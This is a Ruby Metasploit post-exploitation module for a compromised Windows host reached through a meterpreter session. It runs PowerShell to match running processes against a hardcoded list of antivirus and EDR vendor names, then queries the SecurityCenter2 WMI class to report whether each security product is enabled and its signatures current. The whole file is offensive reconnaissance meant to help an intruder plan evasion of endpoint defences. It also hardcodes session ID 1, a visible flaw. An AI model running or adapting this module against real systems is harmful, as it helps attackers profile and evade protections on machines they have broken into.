class MetasploitModule < Msf::Post

    def initialize(info={})
      super(update_info(info,
        'Name'          => 'Determine which antivirus software is installed by wmi query.',
        'Description'   => %q{
            This module query the "antivirusproduct" wmi class to determine which AV is installed.
        },
        'License'       => MSF_LICENSE,
        'Author'        => 'wo4haoren',
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
    end
                                                                                                       
    def run

        print_status("1. Check running process...")
        client.core.use( "powershell" ) if not client.ext.aliases.include?( "powershell" )
        vendors = ['MpCmdRun','MSASCui','Malware','Antivirus','CrowdStrike','Dr.Web','Ad-Aware','Avast','AVG','Avira','BitDefender','ClamAV','DrWeb','eScan','Eset','F-Secure','FireEye','Fortinet','K7AntiVirus','Kaspersky','Kingsoft','Malwarebytes','McAfee','Nano','Palo','Panda','Qihoo','Rising','Sangfor','Sophos','Symantec','Tencent','TrendMicro','Webroot','ZoneAlarm']
        result = client.powershell.execute_string({session_id:1,code:"ps|Where {$_.Description.length -gt 0 }| sort Description,ProcessName -Unique | select { '{0}.exe:{1}' -f $_.ProcessName, $_.Description}"})

        result.split("\n").each do |line|
            vendors.each do |v|
                if line =~ /#{v}/i
                    processName = line.split(":")[0]
                    description = line.split(":")[1]
                    print_error("\tAV process found : #{processName} -> #{description}")
                    break
                end
            end
        end

        print_status("2. Query antivirusproduct wmi table...")
        print_status("\tTarget OS is " + sysinfo['OS'])

        if sysinfo['OS'] !~ /Windows (XP|Vista|7|8|10)/
          print_error("\tOnly supported on Windows \(XP|Vista|7|8|10\)")
          return
        end

        result = client.powershell.execute_string({session_id:1,code:"Get-WmiObject -namespace 'root\\SecurityCenter2' -class antivirusproduct | select { '{0}:{1}' -f $_.displayName,$_.productState }|ft -hide"})
        result.split("\n").each do |line|
            displayName = line.split(":")[0]
            state = line.split(":")[1]
            if state == nil 
                next
            end

            isEnable = sprintf("%06x", state).upcase[2,2].to_i < 10 ? "Disabled" : "Enabled"
            isUpToDate = sprintf("%06x", state).upcase[4,2] == "00" ? "UpToDate" : "not UpToDate" 
            if isEnable == "Enabled" 
                print_error("\t#{displayName} is #{isEnable} and the signature database is #{isUpToDate}")
            else
                print_status("\t#{displayName} is #{isEnable} and the signature database is #{isUpToDate}") 
            end
        end
    end
end